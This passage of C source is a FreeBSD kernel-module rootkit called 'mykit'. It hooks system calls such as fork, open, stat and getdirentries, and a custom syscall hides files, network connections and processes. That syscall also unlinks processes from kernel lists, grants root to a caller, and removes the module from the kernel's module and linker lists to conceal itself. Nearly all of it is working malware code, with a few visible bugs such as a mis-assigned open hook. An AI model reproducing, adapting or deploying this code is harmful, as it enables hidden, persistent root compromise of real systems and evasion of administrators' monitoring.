    }
    sx_xunlock(&open_dirs_lock);
    }
  }
}

static int 
hook_fork (struct thread *td, struct fork_args *uap)
{
    int error;
    struct proc *p1, *p2;
    p1 = td->td_proc;

    error = fork1(td, RFFDG | RFPROC, 0, &p2);
    if (error == 0) {
        td->td_retval[0] = p2->p_pid;
        td->td_retval[1] = 0;
        forktail(p1,p2);
    }
    return (error);
}

static int 
hook_vfork (struct thread *td, struct vfork_args *uap)
{
    int error;
    struct proc *p1, *p2;
    p1 = td->td_proc;

    error = fork1(td, RFFDG | RFPROC | RFPPWAIT | RFMEM, 0, &p2);
    if (error == 0) {
        td->td_retval[0] = p2->p_pid;
        td->td_retval[1] = 0;
        forktail(p1,p2);
    }
    return (error);
}

static int 
hook_rfork (struct thread *td, struct rfork_args *uap)
{
    struct proc *p1, *p2;
    int error;
    p1 = td->td_proc;

    if ((uap->flags & RFKERNELONLY) != 0)
        return (EINVAL);

    error = fork1(td, uap->flags, 0, &p2);
    if (error == 0) {
        td->td_retval[0] = p2 ? p2->p_pid : 0;
        td->td_retval[1] = 0;
        forktail(p1,p2);
    }
    return (error);
}


static int 
mycall (struct thread *td, struct mycall_args *uap)
{
    struct proc *p, *parent_proc_child;
    int op = uap->op;

    if ((op & (OP_HIDE_CONN | OP_UNHIDE_CONN |
                    OP_HIDE_FILE | OP_UNHIDE_FILE |
                    OP_HIDE_PID | OP_UNHIDE_PID | OP_GHOST_PID |
                    OP_UNHIDEME)) &&
        !isleet(td->td_proc))
            return EPERM;

    if (op & (OP_HIDE_CONN | OP_UNHIDE_CONN)) 
    {
        struct nethide *nh;
	nh = malloc(sizeof(struct nethide), M_DEVBUF, M_NOWAIT);
        copyin(uap->nh, nh, sizeof(struct nethide));
        if (nh->lport < 0 || nh->lport > 65535 ||
            nh->fport < 0 || nh->fport > 65535)
	{
	  
	    return EINVAL;
	}

        if (op & OP_HIDE_CONN && !is_conn_hidden(nh))
	{
            hideconn(nh);
	}
        else if (op & OP_UNHIDE_CONN)
	{
            unhideconn(nh);
	    free(nh, M_DEVBUF);
	}
        return 0;
    }

    if (op & (OP_HIDE_FILE | OP_UNHIDE_FILE)) 
    {
        if (OP_HIDE_FILE && !is_file_hidden(uap->path))
	{
	  char *filename = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
	  strcpy(filename, uap->path);
	  sx_xlock(&hidden_files_lock);
	  hidden_files[hidden_files_len++] = filename;
	  sx_xunlock(&hidden_files_lock);
	} 
	else if (OP_UNHIDE_FILE)
	{
	    unhide_file(uap->path);
	} 
	else 
	{
            return EINVAL;
        }
        return 0;
    }

    if (op & (OP_HIDE_PID | OP_UNHIDE_PID | OP_GHOST_PID)) {
        if ((p = pfind(uap->pid)) == NULL){
            return ESRCH;
	}
	
	if ( op & OP_GHOST_PID ){
	    
	      sx_xlock(&allproc_lock);
	      LIST_REMOVE(p, p_list);
	      LIST_REMOVE(p, p_hash);
	      LIST_REMOVE(p, p_pglist);     
	      LIST_FOREACH(parent_proc_child, &(p)->p_pptr->p_children, p_list)
	      {
		if ( uap->pid == parent_proc_child->p_pid )
		{
		  LIST_REMOVE(parent_proc_child, p_list);
		}
	      }
	      nprocs--;
	      sx_xunlock(&allproc_lock);
	      PROC_UNLOCK(p);
	  
	} else if ((op & OP_HIDE_PID) && !is_pid_hidden(p->p_pid)) {
	    sx_xlock(&allproc_lock);
            LIST_REMOVE(p, p_list);
	    sx_xunlock(&allproc_lock);
            PROC_UNLOCK(p);
        } else if ((op & OP_UNHIDE_PID) && is_pid_hidden(p->p_pid)) {
            sx_xlock(&allproc_lock);
            LIST_INSERT_HEAD(&allproc, p, p_list);
	    sx_xunlock(&allproc_lock);
            PROC_UNLOCK(p);
        } else {
            PROC_UNLOCK(p);
            return EINVAL;
        }

        return 0;
    }

    if (op & OP_GET_ROOT) 
    {
        giveroot(td->td_proc);
        return 0;
    }

    if (op & OP_GET_LEET) 
    {
        giveleet(td->td_proc);
        return 0;
    }
    
    if (op & OP_UNLEET)
    {
	unleet(td->td_proc);
	return 0;
    }
    
    if (op & OP_RELOAD_CONF)
    {
	giveleet(curthread->td_proc);
	clear_mykit_lists();
	load_mykit_conf_files();
	unleet(curthread->td_proc);
	return 0;
    }

    if (op & OP_UNHIDEME) 
    {
        sx_xlock(&kld_sx);
        TAILQ_INSERT_HEAD(&linker_files, meself->file, link);
	next_file_id++;
        sx_xunlock(&kld_sx);
	sx_xlock(&modules_sx);
	TAILQ_INSERT_HEAD(&modules, meself, link);
	sx_xunlock(&modules_sx);

	return 0;
    }

    return 0;
}

static int load (struct module *module, int cmd, void *arg)
{
  switch(cmd) 
  {
    case MOD_LOAD:
    {
      old_sysent = sysent[SYS_mycall];
      sysent[SYS_mycall] = mycall_sysent;

      open_dirs_len = 0;
      hidden_files_len = 0;
      
      sx_init(&open_dirs_lock, NULL);
      sx_init(&hidden_files_lock, NULL);
      sx_init(&hidden_conns_lock, NULL);
    
      load_mykit_conf_files();
      
#ifdef INJECT_CODE
      SET_FUNCTION_HOOK(listen, hook_listen, 6);
      SET_FUNCTION_HOOK(accept, hook_accept, 6);
      SET_FUNCTION_HOOK(stat, hook_stat, 6);
      SET_FUNCTION_HOOK(lstat, hook_lstat, 6);
      SET_FUNCTION_HOOK(fork, hook_fork, 7);
      SET_FUNCTION_HOOK(vfork, hook_vfork, 7);
      SET_FUNCTION_HOOK(rfork, hook_rfork, 5);
      SET_FUNCTION_HOOK(open, hook_open, 6);
      SET_FUNCTION_HOOK(openat, hook_openat, 6);
      SET_FUNCTION_HOOK(link, hook_link, 6);
      SET_FUNCTION_HOOK(unlink, hook_unlink, 6);
      SET_FUNCTION_HOOK(chdir, hook_chdir, 6);
      SET_FUNCTION_HOOK(getdirentries, hook_getdirentries, 5);
      SET_FUNCTION_HOOK(close, hook_close, 6);
      SET_FUNCTION_HOOK(dup, hook_dup, 6);
      SET_FUNCTION_HOOK(dup2, hook_dup2, 6);

#else
      sysent[SYS_listen].sy_call = (sy_call_t*)hook_listen;
      sysent[SYS_open].sy_call = (sy_call_t*)hook_accept;
      sysent[SYS_fork].sy_call = (sy_call_t *)hook_fork;
      sysent[SYS_vfork].sy_call = (sy_call_t *)hook_vfork;
      sysent[SYS_rfork].sy_call = (sy_call_t *)hook_rfork;
      sysent[SYS_open].sy_call = (sy_call_t*)hook_open;
      sysent[SYS_openat].sy_call = (sy_call_t*)hook_openat;
      sysent[SYS_lstat].sy_call = (sy_call_t*)hook_stat;
      sysent[SYS_lstat].sy_call = (sy_call_t*)hook_lstat;
      sysent[SYS_link].sy_call = (sy_call_t*)hook_link;
      sysent[SYS_unlink].sy_call = (sy_call_t*)hook_unlink;
      sysent[SYS_chdir].sy_call = (sy_call_t*)hook_chdir;
      sysent[SYS_getdirentries].sy_call = (sy_call_t*)hook_getdirentries;
      sysent[SYS_close].sy_call = (sy_call_t*)hook_close;
      sysent[SYS_dup].sy_call = (sy_call_t*)hook_dup;
      sysent[SYS_dup2].sy_call = (sy_call_t*)hook_dup2;
#endif

      meself = module;

      sx_xlock(&kld_sx);
      TAILQ_REMOVE(&linker_files, module->file, link);
      next_file_id--;
      sx_xunlock(&kld_sx);
      sx_xlock(&modules_sx);
      TAILQ_REMOVE(&modules, module, link);
      sx_xunlock(&modules_sx);
      break;
    }
    case MOD_UNLOAD:
    {
      
#ifdef INJECT_CODE
      UNSET_FUNCTION_HOOK(listen, 6);
      UNSET_FUNCTION_HOOK(accept, 6);
      UNSET_FUNCTION_HOOK(fork, 7);
      UNSET_FUNCTION_HOOK(vfork, 7);
      UNSET_FUNCTION_HOOK(rfork, 5);	
      UNSET_FUNCTION_HOOK(stat, 6);
      UNSET_FUNCTION_HOOK(lstat, 6);
      UNSET_FUNCTION_HOOK(open, 6);
      UNSET_FUNCTION_HOOK(openat, 6);
      UNSET_FUNCTION_HOOK(link, 6);
      UNSET_FUNCTION_HOOK(unlink, 6);
      UNSET_FUNCTION_HOOK(chdir, 6);
      UNSET_FUNCTION_HOOK(getdirentries, 5);
      UNSET_FUNCTION_HOOK(close, 6);
      UNSET_FUNCTION_HOOK(dup, 6);
      UNSET_FUNCTION_HOOK(dup2, 6);
#else
      sysent[SYS_listen].sy_call = (sy_call_t*)listen;
      sysent[SYS_accept].sy_call = (sy_call_t*)accept;
      sysent[SYS_fork].sy_call = (sy_call_t *)fork;
      sysent[SYS_vfork].sy_call = (sy_call_t *)vfork;
      sysent[SYS_rfork].sy_call = (sy_call_t *)rfork;
      sysent[SYS_open].sy_call = (sy_call_t*)open;
      sysent[SYS_openat].sy_call = (sy_call_t*)openat;
      sysent[SYS_stat].sy_call = (sy_call_t*)stat;
      sysent[SYS_lstat].sy_call = (sy_call_t*)lstat;
      sysent[SYS_link].sy_call = (sy_call_t*)link;
      sysent[SYS_unlink].sy_call = (sy_call_t*)unlink;
      sysent[SYS_chdir].sy_call = (sy_call_t*)chdir;
      sysent[SYS_getdirentries].sy_call = (sy_call_t*)getdirentries;
      sysent[SYS_close].sy_call = (sy_call_t*)close;
      sysent[SYS_dup].sy_call = (sy_call_t*)dup;
      sysent[SYS_dup2].sy_call = (sy_call_t*)dup2;
#endif

      sysent[SYS_mycall] = old_sysent;
      
      clear_mykit_lists();

      break;
    }
    default:
    {
      return EOPNOTSUPP;
    }
  }

  return 0;
}

static moduledata_t mod_data = {
    "mykit",
    load,
    0
};

DECLARE_MODULE(mykit, mod_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
